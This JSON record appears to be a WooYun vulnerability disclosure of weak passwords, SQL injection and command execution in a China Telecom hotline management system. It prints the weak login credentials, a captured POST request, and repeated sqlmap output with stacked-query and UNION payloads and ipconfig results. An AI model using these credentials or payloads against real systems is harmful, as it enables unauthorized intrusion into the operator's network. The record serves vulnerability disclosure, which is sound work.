{"id": 77419, "wybug_id": "wooyun-2015-0162565", "wybug_title": "中国电信某管理系统弱口令/sql注入/命令执行打包", "wybug_corp": "中国电信", "wybug_author": "路人甲", "wybug_date": "2015-12-19 15:00", "wybug_open_date": "2016-02-04 17:47", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向公众公开  简要描述： 弱口令>sql注入>命令执行 详细说明：  \n**.**.**.**/\n114便民热线管理系统弱口令\ntest/123456\n\n\n查看账号管理，其他用户也是弱口令\nzgjlbj/123456\n抓包测试，存在sql注入\nHost: **.**.**.**Proxy-Connection: keep-aliveContent-Length: 416Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: **.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: **.**.**.**/Business/TreatBack.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=ccgbbsnya3tr0p552cn20pby; .ASPXAUTH=3315C9F17C31D76FD10434DCA0D82A07DD76D2ECC72DFE65E31F41579A16380BB31A6BE94196A38C5A7788F8B960E240D7C27CBAD565EDF9F7D3ABB3E00BA335DB20060D929A039DFF45D756459A1A2318CD755A7FEC72E315E4C31B4D5939FDD8A9E9F613102B3E889AE9D02FA36961FC7ED8DB__VIEWSTATE=%2FwEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI%2Fml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj%2FCHlQ0PSUo4Yqq8I%2Bddv2lIY&tb_name=%E8%B0%94%E8%B0%94&tb_tel=&tb_address=%E5%91%83+&orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A\n\n\nDBA权限，可命令执行\nsqlmap identified the following injection point(s) with a total of 702 HTTP(s) requests:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008command standard output:---Windows IP 配置  以太网适配器 本地连接*:    媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . :  以太网适配器 本地连接 4:    连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::ed6a:73e0:55a6:5895   IPv4 地址 . . . . . . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . :  以太网适配器 本地连接 3:    连接特定的 DNS 后缀 . . . . . . . :    IPv4 地址 . . . . . . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . : **.**.**.** 以太网适配器 本地连接:    连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::80c3:feb:c53b:5079   自动配置 IPv4 地址  . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . :  隧道适配器 isatap.{3A60B71F-70E7-429F-9857-22BFB1DA7C64}:    媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . :  隧道适配器 isatap.{6528E279-48AB-4C51-AD3A-B32ADE78131C}:    媒体状态  . . . . . . . . . . . . : 媒体已断开\n**.**.**.**&**.**.**.**处于内网，可深入   漏洞证明：  \nsqlmap identified the following injection point(s) with a total of 702 HTTP(s) requests:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008sqlmap resumed the following injection point(s) from stored session:---Parameter: tb_name (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94';WAITFOR DELAY '0:0:5'--&tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: __VIEWSTATE=/wEPDwULLTEzNjg3MzU2MTcPZBYCAgMPZBYGAg0PDxYCHgRUZXh0BTPkvaDlvZPliY3mnIkgMCDnrJTpooTnuqbljZXlsIblnKjkuKTlsI/ml7blhoXliLDmnJ9kZAIPDzwrAA0BAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkZAIRDw8WAh8ABQvmlbDmja46MOadoWRkGAEFCU9yZGVyVmlldw88KwAKAgYVAQhjb2Jfbm90ZQhmZObj/CHlQ0PSUo4Yqq8I ddv2lIY&tb_name=%E8%B0%94%E8%B0%94' UNION ALL SELECT CHAR(113) CHAR(118) CHAR(122) CHAR(106) CHAR(113) CHAR(69) CHAR(88) CHAR(102) CHAR(81) CHAR(121) CHAR(87) CHAR(102) CHAR(120) CHAR(66) CHAR(73) CHAR(113) CHAR(120) CHAR(118) CHAR(112) CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &tb_tel=&tb_address=%E5%91%83 &orderIdText=&checkType=0&ConfirmBtn=%E7%A1%AE%E5%AE%9A---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008command standard output:---Windows IP 配置  以太网适配器 本地连接*:    媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . :  以太网适配器 本地连接 4:    连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::ed6a:73e0:55a6:5895   IPv4 地址 . . . . . . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . :  以太网适配器 本地连接 3:    连接特定的 DNS 后缀 . . . . . . . :    IPv4 地址 . . . . . . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . : **.**.**.** 以太网适配器 本地连接:    连接特定的 DNS 后缀 . . . . . . . :    本地链接 IPv6 地址. . . . . . . . : fe80::80c3:feb:c53b:5079   自动配置 IPv4 地址  . . . . . . . : **.**.**.**   子网掩码  . . . . . . . . . . . . : **.**.**.**   默认网关. . . . . . . . . . . . . :  隧道适配器 isatap.{3A60B71F-70E7-429F-9857-22BFB1DA7C64}:    媒体状态  . . . . . . . . . . . . : 媒体已断开   连接特定的 DNS 后缀 . . . . . . . :  隧道适配器 isatap.{6528E279-48AB-4C51-AD3A-B32ADE78131C}:    媒体状态  . . . . . . . . . . . . : 媒体已断开\n   修复方案：  ...   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-12-23 10:53 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}